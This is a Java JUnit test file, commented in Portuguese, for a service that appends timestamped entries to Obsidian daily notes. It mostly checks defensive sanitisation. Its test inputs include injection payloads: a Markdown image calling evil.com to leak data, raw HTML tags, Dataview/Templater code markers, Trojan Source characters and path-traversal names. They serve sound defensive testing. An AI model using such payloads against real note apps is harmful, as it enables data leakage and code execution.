package io.github.jjoseffelipe2028.bracos.acoes.daily;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Clock;
import java.time.Instant;
import java.time.ZonedDateTime;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

import io.github.jjoseffelipe2028.bracos.erros.AcaoIndisponivelException;
import io.github.jjoseffelipe2028.bracos.erros.EntradaInvalidaException;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/** Testa o Service direto, numa pasta temporária (nunca no Obsidian de verdade). */
class DailyServiceTest {

    // Relógio fixo: 08/11/2026 15:42 em Brasília
    private static final Clock RELOGIO = Clock.fixed(
            ZonedDateTime.of(2026, 11, 8, 15, 42, 0, 0, DailyService.FUSO).toInstant(), DailyService.FUSO);

    @TempDir
    Path pasta;

    private DailyService service() {
        return new DailyService(pasta.toString(), RELOGIO);
    }

    private String ler(String nome) throws Exception {
        return Files.readString(pasta.resolve(nome), StandardCharsets.UTF_8);
    }

    @Test
    void criaNotaDoDiaComTituloELinha() throws Exception {
        String arquivo = service().registrar("estudei Git 30 min");

        assertEquals("2026-11-08.md", arquivo);
        assertEquals("# 2026-11-08\n\n- 15:42 estudei Git 30 min\n", ler(arquivo));
    }

    @Test
    void acrescentaSemApagarOQueJaExiste() throws Exception {
        Files.writeString(pasta.resolve("2026-11-08.md"), "# meu daily\n\ntexto antigo\n");

        service().registrar("linha nova");

        assertEquals("# meu daily\n\ntexto antigo\n- 15:42 linha nova\n", ler("2026-11-08.md"));
    }

    @Test
    void notaSemEnterNoFimNaoGrudaALinhaNova() throws Exception {
        Files.writeString(pasta.resolve("2026-11-08.md"), "ultima linha sem enter");

        service().registrar("nova");

        assertEquals("ultima linha sem enter\n- 15:42 nova\n", ler("2026-11-08.md"));
    }

    @Test
    void acentoSaiCertoEmUtf8() throws Exception {
        service().registrar("ação, café e pão — ótimo 💪");

        assertTrue(ler("2026-11-08.md").contains("- 15:42 ação, café e pão — ótimo 💪\n"));
    }

    @Test
    void quebraDeLinhaViraEspaco_naoDaParaInjetarLinhaFalsa() throws Exception {
        service().registrar("oi\n- 03:00 linha falsa\r\n# titulo falso fim");

        String nota = ler("2026-11-08.md");
        assertEquals("# 2026-11-08\n\n- 15:42 oi - 03:00 linha falsa  # titulo falso fim\n", nota);
        assertEquals(3, nota.split("\n", -1).length - 1, "só 3 quebras: título, linha em branco e a linha");
    }

    // ---- Achado 1 (médio) do jarvis-hacker: marcação Markdown/HTML desarmada ----

    @Test
    void imagemRemotaEDesarmada_naoVazaIpAoAbrirANota() throws Exception {
        service().registrar("![](https://evil.com/x?dado)");
        assertTrue(ler("2026-11-08.md").contains("- 15:42 \\!\\[\\](https://evil.com/x?dado)\n"));
    }

    @Test
    void htmlEDesarmado() throws Exception {
        service().registrar("<img src=x> <iframe>");
        assertTrue(ler("2026-11-08.md").contains("\\<img src=x\\> \\<iframe\\>"));
    }

    @Test
    void dataviewETemplaterSaoDesarmados() throws Exception {
        service().registrar("`$= app.vault` <% tp.system %> {{x}}");
        String nota = ler("2026-11-08.md");
        assertTrue(nota.contains("\\`\\$= app.vault\\` \\<\\% tp.system \\%\\> \\{\\{x\\}\\}"));
        assertFalse(nota.matches("(?s).*(?<!\\\\)`.*"), "nenhuma crase sem escape");
    }

    @Test
    void barraInvertidaNaoDesfazOEscape() throws Exception {
        // "\![" viraria "\\![" → a barra se anula e a imagem voltaria. Por isso a barra também é escapada.
        service().registrar("\\![](x)");
        assertTrue(ler("2026-11-08.md").contains("- 15:42 \\\\\\!\\[\\](x)\n"));
    }

    @Test
    void textoNormalContinuaLegivel() {
        assertEquals("estudei Git 30 min #estudo - ok, café?", DailyService.desarmar("estudei Git 30 min #estudo - ok, café?"));
    }

    // ---- Achado 4: invisíveis (Trojan Source) ----

    @Test
    void caracteresInvisiveisSaem_masEmojiCompostoFica() {
        // U+202E inverte o texto na tela; U+200B é espaço de largura zero
        assertEquals("abc def", DailyService.desarmar("abc‮def").replace("  ", " "));
        assertEquals("a b", DailyService.desarmar("a​b"));
        String familia = "👨‍👩‍👧"; // emoji composto usa U+200D
        assertEquals(familia, DailyService.desarmar(familia));
    }

    // ---- Achado 7: pedaço de emoji quebrado (surrogate solto) ----

    @Test
    void surrogateSoltoViraEspaco_naoQuebraAGravacao() throws Exception {
        service().registrar("oi\uD800tchau");
        assertTrue(ler("2026-11-08.md").contains("- 15:42 oi tchau\n"));
    }

    // ---- Achado 5: nota gigante ----

    @Test
    void notaAcimaDe1MbERecusada_eNaoCresce() throws Exception {
        Path nota = pasta.resolve("2026-11-08.md");
        Files.write(nota, new byte[(int) DailyService.LIMITE_NOTA_BYTES]);
        long antes = Files.size(nota);

        assertThrows(AcaoIndisponivelException.class, () -> service().registrar("mais uma"));
        assertEquals(antes, Files.size(nota));
    }

    // ---- Achado 8: link simbólico ----

    @Test
    void linkSimbolicoERecusado() throws Exception {
        Path fora = Files.createTempFile("fora-da-pasta", ".md");
        Path link = pasta.resolve("2026-11-08.md");
        try {
            Files.createSymbolicLink(link, fora);
        } catch (Exception e) {
            // No Windows, criar link simbólico exige modo desenvolvedor; no GitHub Actions (Linux) roda
            org.junit.jupiter.api.Assumptions.abort("sistema nao deixa criar link simbolico");
        }
        try {
            assertThrows(IllegalStateException.class, () -> service().registrar("oi"));
            assertEquals(0, Files.size(fora), "nada foi escrito fora da pasta");
        } finally {
            Files.deleteIfExists(link);
            Files.deleteIfExists(fora);
        }
    }

    @Test
    void textoSoComControleERecusado() {
        assertThrows(EntradaInvalidaException.class, () -> service().registrar("\u0000\u0007\u0085"));
    }

    @Test
    void pastaNaoConfigurada_503() {
        assertThrows(AcaoIndisponivelException.class,
                () -> new DailyService("", RELOGIO).registrar("oi"));
        assertThrows(AcaoIndisponivelException.class,
                () -> new DailyService(null, RELOGIO).registrar("oi"));
    }

    @Test
    void pastaQueNaoExiste_503() {
        String inexistente = pasta.resolve("nao-existe").toString();
        assertThrows(AcaoIndisponivelException.class,
                () -> new DailyService(inexistente, RELOGIO).registrar("oi"));
    }

    @Test
    void pathTraversalERecusado() throws Exception {
        Path base = pasta.toRealPath();
        assertThrows(IllegalStateException.class, () -> DailyService.dentroDaPasta(base, "../fora.md"));
        assertThrows(IllegalStateException.class, () -> DailyService.dentroDaPasta(base, "a/../../fora.md"));
        assertThrows(IllegalStateException.class, () -> DailyService.dentroDaPasta(base, "."));
        // Nome normal passa
        assertEquals(base.resolve("2026-11-08.md"), DailyService.dentroDaPasta(base, "2026-11-08.md"));
    }

    @Test
    void escritasAoMesmoTempoNaoMisturamLinhas() throws Exception {
        DailyService service = service();
        int total = 50;
        ExecutorService pool = Executors.newFixedThreadPool(8);
        CountDownLatch largada = new CountDownLatch(1);
        List<Future<String>> tarefas = new ArrayList<>();
        try {
            for (int i = 0; i < total; i++) {
                String texto = "linha-" + i + "-" + "x".repeat(500); // linhas grandes para forçar mistura
                tarefas.add(pool.submit(() -> {
                    largada.await();
                    return service.registrar(texto);
                }));
            }
            largada.countDown(); // todas começam juntas
            for (Future<String> t : tarefas) {
                t.get(10, TimeUnit.SECONDS);
            }
        } finally {
            pool.shutdownNow();
        }

        List<String> linhas = Files.readAllLines(pasta.resolve("2026-11-08.md"), StandardCharsets.UTF_8);
        assertEquals("# 2026-11-08", linhas.get(0), "o título aparece uma vez só, no topo");
        Set<String> vistas = new HashSet<>();
        for (String linha : linhas.subList(2, linhas.size())) {
            assertTrue(linha.matches("- 15:42 linha-\\d+-x{500}"), "linha inteira, sem mistura");
            assertTrue(vistas.add(linha), "nenhuma linha repetida");
        }
        assertEquals(total, vistas.size(), "todas as linhas chegaram");
        assertFalse(linhas.stream().skip(1).anyMatch(l -> l.startsWith("# ")), "título não duplicou");
    }

    // --- Melhoria do teste real (12/11): a linha entra em "## O que fiz" ---

    @Test
    void linhaEntraNoFimDoOQueFiz_eNaoNoFimDaNota() throws Exception {
        Files.writeString(pasta.resolve("2026-11-08.md"),
                "# 08/11\n\n## Plano\n- [ ] Cyber\n\n## O que fiz\n- estudei Git\n  - detalhe\n\n## Onde parei\n- Java\n");

        service().registrar("linha nova");

        assertEquals("# 08/11\n\n## Plano\n- [ ] Cyber\n\n## O que fiz\n- estudei Git\n  - detalhe\n"
                + "- 15:42 linha nova\n\n## Onde parei\n- Java\n", ler("2026-11-08.md"));
    }

    @Test
    void duasLinhasSeguidasFicamEmOrdem() throws Exception {
        Files.writeString(pasta.resolve("2026-11-08.md"), "## O que fiz\n-\n\n## Onde parei\n");

        service().registrar("primeira");
        service().registrar("segunda");

        assertEquals("## O que fiz\n-\n- 15:42 primeira\n- 15:42 segunda\n\n## Onde parei\n",
                ler("2026-11-08.md"));
    }

    @Test
    void oQueFizVazioRecebeALinhaLogoAbaixoDoTitulo() throws Exception {
        Files.writeString(pasta.resolve("2026-11-08.md"), "## O que fiz\n\n## Onde parei\n");

        service().registrar("oi");

        assertEquals("## O que fiz\n- 15:42 oi\n\n## Onde parei\n", ler("2026-11-08.md"));
    }

    @Test
    void oQueFizNoFimDaNota_semEnter() throws Exception {
        Files.writeString(pasta.resolve("2026-11-08.md"), "# x\n\n## O que fiz\n- antigo");

        service().registrar("novo");

        assertEquals("# x\n\n## O que fiz\n- antigo\n- 15:42 novo", ler("2026-11-08.md"));
    }

    @Test
    void subtituloDeNivel3FicaDentroDaSecao() throws Exception {
        Files.writeString(pasta.resolve("2026-11-08.md"),
                "## O que fiz\n- a\n### Madrugada\n- b\n## Onde parei\n");

        service().registrar("c");

        assertEquals("## O que fiz\n- a\n### Madrugada\n- b\n- 15:42 c\n## Onde parei\n", ler("2026-11-08.md"));
    }

    @Test
    void notaComCrlfContinuaCrlf() throws Exception {
        Files.writeString(pasta.resolve("2026-11-08.md"), "## O que fiz\r\n- a\r\n\r\n## Onde parei\r\n");

        service().registrar("b");

        assertEquals("## O que fiz\r\n- a\r\n- 15:42 b\r\n\r\n## Onde parei\r\n", ler("2026-11-08.md"));
    }

    @Test
    void acentoAntesDaSecaoNaoDesalinhaOsBytes() throws Exception {
        Files.writeString(pasta.resolve("2026-11-08.md"), "# ação ☕ 💪\n## O que fiz\n- pão\n## Fim\n");

        service().registrar("café");

        assertEquals("# ação ☕ 💪\n## O que fiz\n- pão\n- 15:42 café\n## Fim\n", ler("2026-11-08.md"));
    }

    @Test
    void textoDoUsuarioNaoCriaSecaoFalsa() throws Exception {
        // "## O que fiz" digitado pelo usuário é desarmado na nota: não vira título
        service().registrar("## O que fiz");
        service().registrar("segunda");

        assertTrue(ler("2026-11-08.md").endsWith("- 15:42 segunda\n"), "sem seção de verdade, continua no fim");
    }

    @Test
    void relogioDeVerdadeUsaFusoDeBrasilia() {
        // 02:30 UTC de 09/11 ainda é 08/11 em Brasília (UTC-3)
        Clock utc = Clock.fixed(Instant.parse("2026-11-09T02:30:00Z"), DailyService.FUSO);
        assertEquals("2026-11-08.md", new DailyService(pasta.toString(), utc).registrar("oi"));
    }
}
